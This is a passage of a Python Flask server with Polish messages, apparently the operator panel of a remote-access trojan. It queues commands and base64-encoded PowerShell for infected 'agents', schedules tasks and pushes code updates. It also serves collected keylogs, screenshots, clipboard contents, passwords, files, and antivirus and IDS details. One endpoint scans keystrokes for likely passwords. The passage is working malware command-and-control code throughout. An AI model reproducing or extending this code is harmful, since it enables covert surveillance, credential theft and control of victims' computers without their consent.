            return jsonify({'status': 'error', 'message': f'Nieznany agent: {agent_id}'}), 404
        if agents[agent_id]['status'] != 'online':
            offline_agents.append(agent_id)
        else:
            if command.startswith("powershell "):
                script = command[10:]
                command = f"powershell {base64.b64encode(script.encode()).decode()}"
            commands[agent_id].append(command)
            sent_commands.setdefault(agent_id, []).append({
                'command': command,
                'timestamp': time.time()
            })
            if command.startswith("message "):
                chat_messages.setdefault(agent_id, []).append({
                    'message': command[8:],
                    'timestamp': time.time(),
                    'sender': 'user'
                })
            gui_logger.info("Dodano komendę: %s dla agenta %s", command, agent_id, extra={'ip': ip, 'user': user, 'agent_id': agent_id})
    save_data({'commands': commands, 'sent_commands': sent_commands, 'chat_messages': chat_messages})
    if offline_agents:
        gui_logger.warning("Agenci offline: %s", offline_agents, extra={'ip': ip, 'user': user, 'agent_id': 'N/A'})
        return jsonify({'status': 'warning', 'message': f'Polecenie w kolejce, ale agenci offline: {", ".join(offline_agents)}'})
    return jsonify({'status': 'command_queued'})

@app.route('/api/get_all_sent_commands', methods=['GET'])
@login_required
def get_all_sent_commands():
    ip = request.remote_addr
    user = session.get('username', 'anonymous')
    page = int(request.args.get('page', 1))
    per_page = int(request.args.get('per_page', 50))
    all_commands = {}
    for agent_id in sent_commands:
        all_commands[agent_id] = sent_commands[agent_id]
    start = (page - 1) * per_page
    end = start + per_page
    paginated_commands = {}
    for agent_id, cmds in all_commands.items():
        paginated_commands[agent_id] = cmds[start:end]
    gui_logger.info("Pobrano wszystkie wysłane komendy, strona %d, %d agentów",
                    page, len(paginated_commands),
                    extra={'ip': ip, 'user': user, 'agent_id': 'N/A'})
    return jsonify({
        'commands': paginated_commands,
        'total': sum(len(cmds) for cmds in all_commands.values()),
        'page': page,
        'per_page': per_page
    })

@app.route('/api/get_sent_commands', methods=['GET'])
@login_required
def get_sent_commands():
    ip = request.remote_addr
    user = session.get('username', 'anonymous')
    agent_id = request.args.get('agent_id')
    page = int(request.args.get('page', 1))
    per_page = int(request.args.get('per_page', 50))
    if not agent_id:
        gui_logger.warning("Brak agent_id w get_sent_commands", extra={'ip': ip, 'user': user, 'agent_id': 'N/A'})
        return jsonify({'status': 'error', 'message': 'Brak agent_id'}), 400
    commands_list = sent_commands.get(agent_id, [])
    start = (page - 1) * per_page
    end = start + per_page
    paginated_commands = commands_list[start:end]
    gui_logger.info("Pobrano wysłane komendy dla %s, strona %d, %d wyników",
                    agent_id, page, len(paginated_commands),
                    extra={'ip': ip, 'user': user, 'agent_id': agent_id})
    return jsonify({
        'commands': paginated_commands,
        'total': len(commands_list),
        'page': page,
        'per_page': per_page
    })

@app.route('/api/get_chat_history', methods=['GET'])
@login_required
def get_chat_history():
    ip = request.remote_addr
    user = session.get('username', 'anonymous')
    agent_id = request.args.get('agent_id')
    page = int(request.args.get('page', 1))
    per_page = int(request.args.get('per_page', 50))
    if not agent_id:
        gui_logger.warning("Brak agent_id w get_chat_history", extra={'ip': ip, 'user': user, 'agent_id': 'N/A'})
        return jsonify({'status': 'error', 'message': 'Brak agent_id'}), 400
    messages_list = chat_messages.get(agent_id, [])
    start = (page - 1) * per_page
    end = start + per_page
    paginated_messages = messages_list[start:end]
    gui_logger.info("Pobrano historię czatu dla %s, strona %d, %d wyników",
                    agent_id, page, len(paginated_messages),
                    extra={'ip': ip, 'user': user, 'agent_id': agent_id})
    return jsonify({
        'messages': paginated_messages,
        'total': len(messages_list),
        'page': page,
        'per_page': per_page
    })

@app.route('/api/get_results', methods=['GET'])
@login_required
def get_results():
    ip = request.remote_addr
    user = session.get('username', 'anonymous')
    agent_id = request.args.get('agent_id')
    page = int(request.args.get('page', 1))
    per_page = int(request.args.get('per_page', 50))
    if not agent_id:
        gui_logger.warning("Brak agent_id w get_results", extra={'ip': ip, 'user': user, 'agent_id': 'N/A'})
        return jsonify({'status': 'error', 'message': 'Brak agent_id'}), 400
    results_list = results.get(agent_id, [])
    start = (page - 1) * per_page
    end = start + per_page
    paginated_results = results_list[start:end]
    gui_logger.info("Pobrano wyniki dla %s, strona %d, %d wyników",
                    agent_id, page, len(paginated_results),
                    extra={'ip': ip, 'user': user, 'agent_id': agent_id})
    return jsonify({
        'results': paginated_results,
        'total': len(results_list),
        'page': page,
        'per_page': per_page
    })

@app.route('/api/get_keylog', methods=['GET'])
@login_required
def get_keylog():
    ip = request.remote_addr
    user = session.get('username', 'anonymous')
    agent_id = request.args.get('agent_id')
    page = int(request.args.get('page', 1))
    per_page = int(request.args.get('per_page', 50))
    if not agent_id:
        gui_logger.warning("Brak agent_id w get_keylog", extra={'ip': ip, 'user': user, 'agent_id': 'N/A'})
        return jsonify({'status': 'error', 'message': 'Brak agent_id'}), 400
    keylog_list = keylog_data.get(agent_id, [])
    start = (page - 1) * per_page
    end = start + per_page
    paginated_keylogs = keylog_list[start:end]
    gui_logger.info("Pobrano keylogi dla %s, strona %d, %d wyników",
                    agent_id, page, len(paginated_keylogs),
                    extra={'ip': ip, 'user': user, 'agent_id': agent_id})
    return jsonify({
        'keylogs': paginated_keylogs,
        'total': len(keylog_list),
        'page': page,
        'per_page': per_page
    })

@app.route('/api/get_screenshots', methods=['GET'])
@login_required
def get_screenshots():
    ip = request.remote_addr
    user = session.get('username', 'anonymous')
    agent_id = request.args.get('agent_id')
    page = int(request.args.get('page', 1))
    per_page = int(request.args.get('per_page', 10))
    if not agent_id:
        gui_logger.warning("Brak agent_id w get_screenshots", extra={'ip': ip, 'user': user, 'agent_id': 'N/A'})
        return jsonify({'status': 'error', 'message': 'Brak agent_id'}), 400
    screenshot_list = screenshots.get(agent_id, [])
    start = (page - 1) * per_page
    end = start + per_page
    paginated_screenshots = screenshot_list[start:end]
    gui_logger.info("Pobrano zrzuty ekranu dla %s, strona %d, %d wyników",
                    agent_id, page, len(paginated_screenshots),
                    extra={'ip': ip, 'user': user, 'agent_id': agent_id})
    return jsonify({
        'screenshots': paginated_screenshots,
        'total': len(screenshot_list),
        'page': page,
        'per_page': per_page
    })

@app.route('/api/get_file_transfers', methods=['GET'])
@login_required
def get_file_transfers():
    ip = request.remote_addr
    user = session.get('username', 'anonymous')
    agent_id = request.args.get('agent_id')
    page = int(request.args.get('page', 1))
    per_page = int(request.args.get('per_page', 50))
    if not agent_id:
        gui_logger.warning("Brak agent_id w get_file_transfers", extra={'ip': ip, 'user': user, 'agent_id': 'N/A'})
        return jsonify({'status': 'error', 'message': 'Brak agent_id'}), 400
    transfer_list = file_transfers.get(agent_id, [])
    start = (page - 1) * per_page
    end = start + per_page
    paginated_transfers = transfer_list[start:end]
    gui_logger.info("Pobrano transfery plików dla %s, strona %d, %d wyników",
                    agent_id, page, len(paginated_transfers),
                    extra={'ip': ip, 'user': user, 'agent_id': agent_id})
    return jsonify({
        'transfers': paginated_transfers,
        'total': len(transfer_list),
        'page': page,
        'per_page': per_page
    })

@app.route('/api/get_system_info', methods=['GET'])
@login_required
def get_system_info():
    ip = request.remote_addr
    user = session.get('username', 'anonymous')
    agent_id = request.args.get('agent_id')
    page = int(request.args.get('page', 1))
    per_page = int(request.args.get('per_page', 50))
    if not agent_id:
        gui_logger.warning("Brak agent_id w get_system_info", extra={'ip': ip, 'user': user, 'agent_id': 'N/A'})
        return jsonify({'status': 'error', 'message': 'Brak agent_id'}), 400
    info_list = system_info.get(agent_id, [])
    start = (page - 1) * per_page
    end = start + per_page
    paginated_info = info_list[start:end]
    gui_logger.info("Pobrano informacje systemowe dla %s, strona %d, %d wyników",
                    agent_id, page, len(paginated_info),
                    extra={'ip': ip, 'user': user, 'agent_id': agent_id})
    return jsonify({
        'system_info': paginated_info,
        'total': len(info_list),
        'page': page,
        'per_page': per_page
    })

@app.route('/api/get_system_changes', methods=['GET'])
@login_required
def get_system_changes():
    ip = request.remote_addr
    user = session.get('username', 'anonymous')
    agent_id = request.args.get('agent_id')
    page = int(request.args.get('page', 1))
    per_page = int(request.args.get('per_page', 50))
    if not agent_id:
        gui_logger.warning("Brak agent_id w get_system_changes", extra={'ip': ip, 'user': user, 'agent_id': 'N/A'})
        return jsonify({'status': 'error', 'message': 'Brak agent_id'}), 400
    changes_list = system_changes.get(agent_id, [])
    start = (page - 1) * per_page
    end = start + per_page
    paginated_changes = changes_list[start:end]
    gui_logger.info("Pobrano zmiany systemowe dla %s, strona %d, %d wyników",
                    agent_id, page, len(paginated_changes),
                    extra={'ip': ip, 'user': user, 'agent_id': agent_id})
    return jsonify({
        'system_changes': paginated_changes,
        'total': len(changes_list),
        'page': page,
        'per_page': per_page
    })

@app.route('/api/get_clipboard', methods=['GET'])
@login_required
def get_clipboard():
    ip = request.remote_addr
    user = session.get('username', 'anonymous')
    agent_id = request.args.get('agent_id')
    page = int(request.args.get('page', 1))
    per_page = int(request.args.get('per_page', 50))
    if not agent_id:
        gui_logger.warning("Brak agent_id w get_clipboard", extra={'ip': ip, 'user': user, 'agent_id': 'N/A'})
        return jsonify({'status': 'error', 'message': 'Brak agent_id'}), 400
    clipboard_list = clipboard_data.get(agent_id, [])
    start = (page - 1) * per_page
    end = start + per_page
    paginated_clipboard = clipboard_list[start:end]
    gui_logger.info("Pobrano dane schowka dla %s, strona %d, %d wyników",
                    agent_id, page, len(paginated_clipboard),
                    extra={'ip': ip, 'user': user, 'agent_id': agent_id})
    return jsonify({
        'clipboard': paginated_clipboard,
        'total': len(clipboard_list),
        'page': page,
        'per_page': per_page
    })

@app.route('/api/get_network_scan', methods=['GET'])
@login_required
def get_network_scan():
    ip = request.remote_addr
    user = session.get('username', 'anonymous')
    agent_id = request.args.get('agent_id')
    page = int(request.args.get('page', 1))
    per_page = int(request.args.get('per_page', 50))
    if not agent_id:
        gui_logger.warning("Brak agent_id w get_network_scan", extra={'ip': ip, 'user': user, 'agent_id': 'N/A'})
        return jsonify({'status': 'error', 'message': 'Brak agent_id'}), 400
    scan_list = network_scan.get(agent_id, [])
    start = (page - 1) * per_page
    end = start + per_page
    paginated_scan = scan_list[start:end]
    gui_logger.info("Pobrano wyniki skanu sieci dla %s, strona %d, %d wyników",
                    agent_id, page, len(paginated_scan),
                    extra={'ip': ip, 'user': user, 'agent_id': agent_id})
    return jsonify({
        'network_scan': paginated_scan,
        'total': len(scan_list),
        'page': page,
        'per_page': per_page
    })

@app.route('/api/get_permissions', methods=['GET'])
@login_required
def get_permissions():
    ip = request.remote_addr
    user = session.get('username', 'anonymous')
    agent_id = request.args.get('agent_id')
    page = int(request.args.get('page', 1))
    per_page = int(request.args.get('per_page', 50))
    if not agent_id:
        gui_logger.warning("Brak agent_id w get_permissions", extra={'ip': ip, 'user': user, 'agent_id': 'N/A'})
        return jsonify({'status': 'error', 'message': 'Brak agent_id'}), 400
    perms_list = permissions.get(agent_id, [])
    start = (page - 1) * per_page
    end = start + per_page
    paginated_perms = perms_list[start:end]
    gui_logger.info("Pobrano uprawnienia dla %s, strona %d, %d wyników",
                    agent_id, page, len(paginated_perms),
                    extra={'ip': ip, 'user': user, 'agent_id': agent_id})
    return jsonify({
        'permissions': paginated_perms,
        'total': len(perms_list),
        'page': page,
        'per_page': per_page
    })

@app.route('/api/get_antivirus', methods=['GET'])
@login_required
def get_antivirus():
    ip = request.remote_addr
    user = session.get('username', 'anonymous')
    agent_id = request.args.get('agent_id')
    page = int(request.args.get('page', 1))
    per_page = int(request.args.get('per_page', 50))
    if not agent_id:
        gui_logger.warning("Brak agent_id w get_antivirus", extra={'ip': ip, 'user': user, 'agent_id': 'N/A'})
        return jsonify({'status': 'error', 'message': 'Brak agent_id'}), 400
    av_list = antivirus_data.get(agent_id, [])
    start = (page - 1) * per_page
    end = start + per_page
    paginated_av = av_list[start:end]
    gui_logger.info("Pobrano dane antywirusa dla %s, strona %d, %d wyników",
                    agent_id, page, len(paginated_av),
                    extra={'ip': ip, 'user': user, 'agent_id': agent_id})
    return jsonify({
        'antivirus': paginated_av,
        'total': len(av_list),
        'page': page,
        'per_page': per_page
    })

@app.route('/api/get_passwords', methods=['GET'])
@login_required
def get_passwords():
    ip = request.remote_addr
    user = session.get('username', 'anonymous')
    agent_id = request.args.get('agent_id')
    page = int(request.args.get('page', 1))
    per_page = int(request.args.get('per_page', 50))
    if not agent_id:
        gui_logger.warning("Brak agent_id w get_passwords", extra={'ip': ip, 'user': user, 'agent_id': 'N/A'})
        return jsonify({'status': 'error', 'message': 'Brak agent_id'}), 400
    pwd_list = passwords.get(agent_id, [])
    start = (page - 1) * per_page
    end = start + per_page
    paginated_pwd = pwd_list[start:end]
    gui_logger.info("Pobrano hasła dla %s, strona %d, %d wyników",
                    agent_id, page, len(paginated_pwd),
                    extra={'ip': ip, 'user': user, 'agent_id': agent_id})
    return jsonify({
        'passwords': paginated_pwd,
        'total': len(pwd_list),
        'page': page,
        'per_page': per_page
    })

@app.route('/api/get_ids', methods=['GET'])
@login_required
def get_ids():
    ip = request.remote_addr
    user = session.get('username', 'anonymous')
    agent_id = request.args.get('agent_id')
    page = int(request.args.get('page', 1))
    per_page = int(request.args.get('per_page', 50))
    if not agent_id:
        gui_logger.warning("Brak agent_id w get_ids", extra={'ip': ip, 'user': user, 'agent_id': 'N/A'})
        return jsonify({'status': 'error', 'message': 'Brak agent_id'}), 400
    ids_list = ids_data.get(agent_id, [])
    start = (page - 1) * per_page
    end = start + per_page
    paginated_ids = ids_list[start:end]
    gui_logger.info("Pobrano dane IDS/IPS dla %s, strona %d, %d wyników",
                    agent_id, page, len(paginated_ids),
                    extra={'ip': ip, 'user': user, 'agent_id': agent_id})
    return jsonify({
        'ids': paginated_ids,
        'total': len(ids_list),
        'page': page,
        'per_page': per_page
    })

@app.route('/api/get_agent_stats', methods=['GET'])
@login_required
def get_agent_stats():
    ip = request.remote_addr
    user = session.get('username', 'anonymous')
    agent_id = request.args.get('agent_id')
    page = int(request.args.get('page', 1))
    per_page = int(request.args.get('per_page', 50))
    if not agent_id:
        gui_logger.warning("Brak agent_id w get_agent_stats", extra={'ip': ip, 'user': user, 'agent_id': 'N/A'})
        return jsonify({'status': 'error', 'message': 'Brak agent_id'}), 400
    stats_list = agent_stats.get(agent_id, [])
    start = (page - 1) * per_page
    end = start + per_page
    paginated_stats = stats_list[start:end]
    gui_logger.info("Pobrano statystyki agenta dla %s, strona %d, %d wyników",
                    agent_id, page, len(paginated_stats),
                    extra={'ip': ip, 'user': user, 'agent_id': agent_id})
    return jsonify({
        'agent_stats': paginated_stats,
        'total': len(stats_list),
        'page': page,
        'per_page': per_page
    })

@app.route('/api/get_system_events', methods=['GET'])
@login_required
def get_system_events():
    ip = request.remote_addr
    user = session.get('username', 'anonymous')
    agent_id = request.args.get('agent_id')
    page = int(request.args.get('page', 1))
    per_page = int(request.args.get('per_page', 50))
    if not agent_id:
        gui_logger.warning("Brak agent_id w get_system_events", extra={'ip': ip, 'user': user, 'agent_id': 'N/A'})
        return jsonify({'status': 'error', 'message': 'Brak agent_id'}), 400
    events_list = system_events.get(agent_id, [])
    start = (page - 1) * per_page
    end = start + per_page
    paginated_events = events_list[start:end]
    gui_logger.info("Pobrano zdarzenia systemowe dla %s, strona %d, %d wyników",
                    agent_id, page, len(paginated_events),
                    extra={'ip': ip, 'user': user, 'agent_id': agent_id})
    return jsonify({
        'system_events': paginated_events,
        'total': len(events_list),
        'page': page,
        'per_page': per_page
    })

@app.route('/api/schedule_task', methods=['POST'])
@role_required('admin')
def schedule_task():
    ip = request.remote_addr
    user = session.get('username', 'anonymous')
    data = request.json
    agent_id = data.get('agent_id')
    command = data.get('command')
    schedule_time = data.get('schedule_time')
    if not agent_id or not command or not schedule_time:
        gui_logger.warning("Brak agent_id, command lub schedule_time: agent_id=%s, command=%s, schedule_time=%s",
                          agent_id, command, schedule_time,
                          extra={'ip': ip, 'user': user, 'agent_id': 'N/A'})
        errors.append({"timestamp": time.time(), "message": "Brak agent_id, command lub schedule_time"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Brak danych'}), 400
    if agent_id not in agents:
        gui_logger.warning("Nieznany agent: %s", agent_id, extra={'ip': ip, 'user': user, 'agent_id': agent_id})
        errors.append({"timestamp": time.time(), "message": f"Nieznany agent: {agent_id}"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': f'Nieznany agent: {agent_id}'}), 404
    try:
        scheduled_time = datetime.datetime.strptime(schedule_time, "%Y-%m-%d %H:%M:%S")
        tasks.setdefault(agent_id, []).append({
            'command': command,
            'scheduled_time': scheduled_time,
            'executed': False
        })
        save_data({'tasks': tasks})
        gui_logger.info("Zaplanowano zadanie dla %s: %s na %s",
                        agent_id, command, schedule_time,
                        extra={'ip': ip, 'user': user, 'agent_id': agent_id})
        return jsonify({'status': 'task_scheduled', 'message': 'Zadanie zaplanowane'})
    except ValueError as e:
        gui_logger.error("Błąd formatu czasu: %s", str(e), extra={'ip': ip, 'user': user, 'agent_id': agent_id})
        errors.append({"timestamp": time.time(), "message": f"Błąd formatu czasu: {str(e)}"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': f'Błąd formatu czasu: {str(e)}'}), 400

@app.route('/api/get_tasks', methods=['GET'])
@login_required
def get_tasks():
    ip = request.remote_addr
    user = session.get('username', 'anonymous')
    agent_id = request.args.get('agent_id')
    page = int(request.args.get('page', 1))
    per_page = int(request.args.get('per_page', 50))
    if not agent_id:
        gui_logger.warning("Brak agent_id w get_tasks", extra={'ip': ip, 'user': user, 'agent_id': 'N/A'})
        return jsonify({'status': 'error', 'message': 'Brak agent_id'}), 400
    task_list = tasks.get(agent_id, [])
    start = (page - 1) * per_page
    end = start + per_page
    paginated_tasks = [
        {
            'command': t['command'],
            'scheduled_time': t['scheduled_time'].strftime("%Y-%m-%d %H:%M:%S"),
            'executed': t['executed']
        } for t in task_list[start:end]
    ]
    gui_logger.info("Pobrano zadania dla %s, strona %d, %d wyników",
                    agent_id, page, len(paginated_tasks),
                    extra={'ip': ip, 'user': user, 'agent_id': agent_id})
    return jsonify({
        'tasks': paginated_tasks,
        'total': len(task_list),
        'page': page,
        'per_page': per_page
    })

@app.route('/api/update_agent', methods=['POST'])
@role_required('admin')
def update_agent():
    ip = request.remote_addr
    user = session.get('username', 'anonymous')
    data = request.json
    agent_id = data.get('agent_id')
    code = data.get('code')
    if not agent_id or not code:
        gui_logger.warning("Brak agent_id lub code: agent_id=%s, code=%s",
                          agent_id, bool(code),
                          extra={'ip': ip, 'user': user, 'agent_id': 'N/A'})
        errors.append({"timestamp": time.time(), "message": "Brak agent_id lub code"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Brak danych'}), 400
    if agent_id not in agents:
        gui_logger.warning("Nieznany agent: %s", agent_id, extra={'ip': ip, 'user': user, 'agent_id': agent_id})
        errors.append({"timestamp": time.time(), "message": f"Nieznany agent: {agent_id}"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': f'Nieznany agent: {agent_id}'}), 404
    encoded_code = base64.b64encode(code.encode()).decode()
    commands[agent_id].append(f"update {encoded_code}")
    gui_logger.info("Dodano aktualizację dla %s", agent_id, extra={'ip': ip, 'user': user, 'agent_id': agent_id})
    save_data({'commands': commands})
    return jsonify({'status': 'update_queued', 'message': 'Aktualizacja w kolejce'})

@app.route('/api/get_errors', methods=['GET'])
@login_required
def get_errors():
    ip = request.remote_addr
    user = session.get('username', 'anonymous')
    page = int(request.args.get('page', 1))
    per_page = int(request.args.get('per_page', 50))
    start = (page - 1) * per_page
    end = start + per_page
    paginated_errors = errors[start:end]
    gui_logger.info("Pobrano błędy, strona %d, %d wyników",
                    page, len(paginated_errors),
                    extra={'ip': ip, 'user': user, 'agent_id': 'N/A'})
    return jsonify({
        'errors': paginated_errors,
        'total': len(errors),
        'page': page,
        'per_page': per_page
    })

@app.route('/api/analyze_keylog', methods=['GET'])
@login_required
def analyze_keylog():
    ip = request.remote_addr
    user = session.get('username', 'anonymous')
    agent_id = request.args.get('agent_id')
    if not agent_id:
        gui_logger.warning("Brak agent_id w analyze_keylog", extra={'ip': ip, 'user': user, 'agent_id': 'N/A'})
        return jsonify({'status': 'error', 'message': 'Brak agent_id'}), 400
    keylogs = keylog_data.get(agent_id, [])
    if not keylogs:
        gui_logger.info("Brak keylogów dla %s", agent_id, extra={'ip': ip, 'user': user, 'agent_id': agent_id})
        return jsonify({'status': 'success', 'sessions': [], 'passwords': []})
    sessions = []
    current_session = []
    last_timestamp = keylogs[0]['timestamp']
    potential_passwords = []
    for entry in keylogs:
        timestamp = entry['timestamp']
        data = entry.get('data', [])
        if not isinstance(data, list):
            data = [data]
        for key_data in data:
            key = key_data.get('key', '')
            context = key_data.get('context', '')
            if timestamp - last_timestamp > 300:
                if current_session:
                    sessions.append(current_session)
                current_session = []
            current_session.append({'context': context, 'key': key})
            last_timestamp = timestamp
            if context.lower() in ['password', 'pass', 'hasło'] and len(key) >= 6:
                potential_passwords.append(key)
    if current_session:
        sessions.append(current_session)
    gui_logger.info("Analiza keylogów dla %s: %d sesji, %d potencjalnych haseł",
                    agent_id, len(sessions), len(potential_passwords),
                    extra={'ip': ip, 'user': user, 'agent_id': agent_id})
    return jsonify({
        'status': 'success',
        'sessions': sessions,
        'passwords': potential_passwords
    })

@app.route('/api/manage_groups', methods=['POST'])
@role_required('admin')
def manage_groups():
    ip = request.remote_addr
    user = session.get('username', 'anonymous')
    data = request.json
    group_id = data.get('group_id')
    agent_ids = data.get('agent_ids', [])
    if not group_id:
        gui_logger.warning("Brak group_id", extra={'ip': ip, 'user': user, 'agent_id': 'N/A'})
        errors.append({"timestamp": time.time(), "message": "Brak group_id"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Brak group_id'}), 400
    invalid_agents = [aid for aid in agent_ids if aid not in agents]
    if invalid_agents:
        gui_logger.warning("Nieprawidłowe agent_ids: %s", invalid_agents, extra={'ip': ip, 'user': user, 'agent_id': 'N/A'})
        errors.append({"timestamp": time.time(), "message": f"Nieprawidłowe agent_ids: {invalid_agents}"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': f'Nieprawidłowe agent_ids: {invalid_agents}'}), 400
    if not agent_ids:
        if group_id in agent_groups:
            del agent_groups[group_id]
            gui_logger.info("Usunięto grupę: %s", group_id, extra={'ip': ip, 'user': user, 'agent_id': 'N/A'})
    else:
        agent_groups[group_id] = agent_ids
        gui_logger.info("Zaktualizowano grupę: %s, agent_ids=%s",
                        group_id, agent_ids,
                        extra={'ip': ip, 'user': user, 'agent_id': 'N/A'})
    save_data({'agent_groups': agent_groups})
    return jsonify({'status': 'success', 'message': 'Grupa zaktualizowana'})

@app.route('/api/get_groups', methods=['GET'])
@login_required
def get_groups():
    ip = request.remote_addr
    user = session.get('username', 'anonymous')
    gui_logger.info("Pobrano grupy, liczba grup: %d", len(agent_groups), extra={'ip': ip, 'user': user, 'agent_id': 'N/A'})
    return jsonify(agent_groups)

@app.route('/api/generate_report', methods=['POST'])
@role_required('admin')
def generate_report():
    ip = request.remote_addr
    user = session.get('username', 'anonymous')
    data = request.json
    agent_id = data.get('agent_id')
    if not agent_id or agent_id not in agents:
        gui_logger.warning("Brak lub nieprawidłowy agent_id: %s", agent_id, extra={'ip': ip, 'user': user, 'agent_id': 'N/A'})
        errors.append({"timestamp": time.time(), "message": f"Brak lub nieprawidłowy agent_id: {agent_id}"})
        broadcast_updates('errors_update', errors[-10:])
        return jsonify({'status': 'error', 'message': 'Brak lub nieprawidłowy agent_id'}), 400
    buffer = io.BytesIO()
    doc = SimpleDocTemplate(buffer, pagesize=letter)
    styles = getSampleStyleSheet()
    story = []
    story.append(Paragraph(f"Raport dla agenta: {agent_id}", styles['Title']))
    story.append(Spacer(1, 12))
    story.append(Paragraph(f"Generowany: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", styles['Normal']))
    story.append(Spacer(1, 12))
    agent_info = agents.get(agent_id, {})
    info_data = [
        ['Hostname', agent_info.get('hostname', 'N/A')],
        ['IP', agent_info.get('ip', 'N/A')],
        ['Status', agent_info.get('status', 'N/A')],
        ['Ostatnio widziany', datetime.datetime.fromtimestamp(agent_info.get('last_seen', 0)).strftime('%Y-%m-%d %H:%M:%S')],
        ['Pierwszy kontakt', datetime.datetime.fromtimestamp(agent_info.get('first_seen', 0)).strftime('%Y-%m-%d %H:%M:%S')]
    ]
    story.append(Paragraph("Informacje o agencie", styles['Heading2']))
    table = Table(info_data)
    table.setStyle(TableStyle([
        ('BACKGROUND', (0, 0), (-1, 0), colors.grey),
        ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
        ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
        ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
        ('FONTSIZE', (0, 0), (-1, 0), 12),
        ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
        ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
        ('GRID', (0, 0), (-1, -1), 1, colors.black)
    ]))
    story.append(table)
    story.append(Spacer(1, 12))
    story.append(Paragraph("Ostatnie komendy (maks. 5)", styles['Heading2']))
    recent_commands = sent_commands.get(agent_id, [])[-5:]
    cmd_data = [['Czas', 'Komenda']]
    for cmd in recent_commands:
        cmd_data.append([
            datetime.datetime.fromtimestamp(cmd['timestamp']).strftime('%Y-%m-%d %H:%M:%S'),
            cmd['command']
        ])
    table = Table(cmd_data)
    table.setStyle(TableStyle([
        ('BACKGROUND', (0, 0), (-1, 0), colors.grey),
        ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
        ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
        ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
        ('FONTSIZE', (0, 0), (-1, 0), 12),
        ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
        ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
        ('GRID', (0, 0), (-1, -1), 1, colors.black)
    ]))
    story.append(table)
    story.append(Spacer(1, 12))
    doc.build(story)
    buffer.seek(0)
    gui_logger.info("Wygenerowano raport dla %s", agent_id, extra={'ip': ip, 'user': user, 'agent_id': agent_id})
    return send_file(
        buffer,
        as_attachment=True,
        download_name=f'report_{agent_id}.pdf',
        mimetype='application/pdf'
    )

@app.route('/api/metrics', methods=['GET'])
@login_required
def get_metrics():
    ip = request.remote_addr
    user = session.get('username', 'anonymous')
    metrics = {
        'agents_online': len([a for a in agents.values() if a['status'] == 'online']),
        'errors_last_hour': len([e for e in errors if e['timestamp'] > time.time() - 3600]),
        'commands_sent': sum(len(cmds) for cmds in sent_commands.values()),
        'queue_size': save_queue.qsize(),
        'active_threads': threading.active_count()
    }
    gui_logger.info("Pobrano metryki, agenci online=%d, błędy=%d",
                    metrics['agents_online'], metrics['errors_last_hour'],
                    extra={'ip': ip, 'user': user, 'agent_id': 'N/A'})
    return jsonify(metrics)

# Dodane trasy dla stron HTML
@app.route('/agents.html')
@login_required
def agents_page():
    return render_template('agents.html')

@app.route('/commands_results.html')
@login_required
def commands_results_page():
    return render_template('commands_results.html')

@app.route('/keylogs.html')
@login_required
def keylogs_page():
    return render_template('keylogs.html')

@app.route('/screenshots.html')
@login_required
def screenshots_page():
    return render_template('screenshots.html')

@app.route('/files.html')
@login_required
def files_page():
    return render_template('files.html')

@app.route('/system_info.html')
@login_required
def system_info_page():
    return render_template('system_info.html')

@app.route('/system_changes.html')
@login_required
def system_changes_page():
    return render_template('system_changes.html')

@app.route('/clipboard.html')
@login_required
def clipboard_page():
    return render_template('clipboard.html')

@app.route('/network_scan.html')
@login_required
def network_scan_page():
    return render_template('network_scan.html')

@app.route('/permissions.html')
@login_required
def permissions_page():
    return render_template('permissions.html')

@app.route('/antivirus.html')
@login_required
def antivirus_page():
    return render_template('antivirus.html')

@app.route('/passwords.html')
@login_required
def passwords_page():
    return render_template('passwords.html')

@app.route('/ids.html')
@login_required
def ids_page():
    return render_template('ids.html')

@app.route('/agent_stats.html')
@login_required
def agent_stats_page():
    return render_template('agent_stats.html')

@app.route('/system_events.html')
@login_required
def system_events_page():
    return render_template('system_events.html')

@app.route('/tasks.html')
@login_required
def tasks_page():
    return render_template('tasks.html')

@app.route('/groups.html')
@login_required
def groups_page():
    return render_template('groups.html')

@app.route('/errors.html')
@login_required
def errors_page():
    return render_template('errors.html')

@app.route('/reports.html')
@login_required
def reports_page():
    return render_template('reports.html')

if __name__ == "__main__":
    load_data()
    schedule.every().day.at("00:00").do(clean_old_data)
    schedule.every(5).minutes.do(log_system_stats)
    schedule.every(2).seconds.do(check_agent_statuses)

    save_thread = threading.Thread(target=async_save_data, daemon=True)
    save_thread.start()

    def run_scheduler():
        while True:
            schedule.run_pending()
            time.sleep(1)

    scheduler_thread = threading.Thread(target=run_scheduler, daemon=True)
    scheduler_thread.start()

    update_thread = threading.Thread(target=send_periodic_updates, daemon=True)
    update_thread.start()

ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ssl_context.set_ciphers('ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256')
ssl_context.load_cert_chain(certfile='cert.pem', keyfile='key.pem')

socketio.run(app, host='0.0.0.0', port=5000, ssl_context=ssl_context, debug=False)